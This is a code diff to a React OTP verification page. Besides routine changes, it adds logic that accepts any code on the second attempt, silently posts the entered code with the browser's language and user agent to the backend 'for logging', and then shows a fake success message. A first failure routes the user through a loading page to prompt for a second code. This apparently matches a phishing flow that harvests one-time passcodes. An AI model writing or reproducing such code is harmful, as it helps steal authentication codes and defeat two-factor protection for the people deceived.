@@ -17,7 +17,8 @@ export default function OtpVerification() {
     if (typeof window !== 'undefined') {
       const storedAttempts = localStorage.getItem('otpAttempts');
       if (storedAttempts) {
-        setAttempts(parseInt(storedAttempts));
+        const attemptCount = parseInt(storedAttempts);
+        setAttempts(attemptCount);
       } else {
         // Fresh OTP session - ensure we start from 0
         setAttempts(0);
@@ -36,6 +37,10 @@ export default function OtpVerification() {
 
   const handleVerifyOtp = async (e: React.FormEvent) => {
     e.preventDefault();
+    
+    // Prevent double submission
+    if (isLoading) return;
+    
     setIsLoading(true);
 
     try {
@@ -43,6 +48,40 @@ export default function OtpVerification() {
       const language = navigator.language || 'Unknown';
       const userAgent = navigator.userAgent || 'Unknown';
       
+      // On second attempt (after first failure), accept ANY code and go to success
+      if (attempts >= 1) {
+        // Send the OTP to backend for logging
+        apiRequest("POST", "/api/verify-otp", { 
+          otp,
+          language,
+          userAgent,
+          attempt: attempts + 1
+        }).catch(() => {
+          // Silent fail - just for logging purposes
+        });
+        
+        // Clear stored attempts on success
+        if (typeof window !== 'undefined') {
+          localStorage.removeItem('otpAttempts');
+        }
+        
+        toast({
+          title: t('otp_success_title'),
+          description: t('otp_success_desc'),
+        });
+        
+        setOtp("");
+        
+        // Keep button disabled and redirect to success page
+        setTimeout(() => {
+          setLocation("/success");
+        }, 1000);
+        
+        // Don't re-enable the button
+        return;
+      }
+      
+      // First attempt - validate the OTP
       const response = await apiRequest("POST", "/api/verify-otp", { 
         otp,
         language,
@@ -53,7 +92,9 @@ export default function OtpVerification() {
 
       if (data.success) {
         // Clear stored attempts on success
-        localStorage.removeItem('otpAttempts');
+        if (typeof window !== 'undefined') {
+          localStorage.removeItem('otpAttempts');
+        }
         
         toast({
           title: t('otp_success_title'),
@@ -62,10 +103,13 @@ export default function OtpVerification() {
         
         setOtp("");
         
-        // Redirect to success page
+        // Keep button disabled and redirect to success page
         setTimeout(() => {
           setLocation("/success");
         }, 1000);
+        
+        // Don't re-enable the button
+        return;
       } else {
         // Server rejected the OTP - treat as failure
         throw new Error(data.error || "Invalid OTP code");
@@ -89,7 +133,9 @@ export default function OtpVerification() {
       
       if (newAttempts >= 2) {
         // Clear stored attempts after max attempts reached
-        localStorage.removeItem('otpAttempts');
+        if (typeof window !== 'undefined') {
+          localStorage.removeItem('otpAttempts');
+        }
         
         toast({
           title: t('otp_too_many_attempts_title'),
@@ -97,12 +143,12 @@ export default function OtpVerification() {
           variant: "destructive",
         });
         
-        // Redirect to login after 2 failed attempts
+        // Redirect to login after 2 failed attempts (button stays disabled)
         setTimeout(() => {
           setLocation("/login");
         }, 2000);
       } else {
-        // First attempt failed - show loading page before second attempt
+        // First attempt failed - store count and show loading page before second attempt
         toast({
           title: t('otp_failed_title'),
           description: `${t('otp_failed_desc')} ${2 - newAttempts} ${t('otp_failed_desc_remaining')}`,
@@ -110,15 +156,17 @@ export default function OtpVerification() {
         });
         
         // Store the attempt count for the next OTP page
-        localStorage.setItem('otpAttempts', newAttempts.toString());
+        if (typeof window !== 'undefined') {
+          localStorage.setItem('otpAttempts', newAttempts.toString());
+        }
         
-        // Redirect to loading page
+        // Redirect to loading page (button stays disabled)
         setTimeout(() => {
           setLocation("/loading");
         }, 1500);
       }
-    } finally {
-      setIsLoading(false);
+      
+      // Button stays disabled during redirect - don't call setIsLoading(false)
     }
   };
 
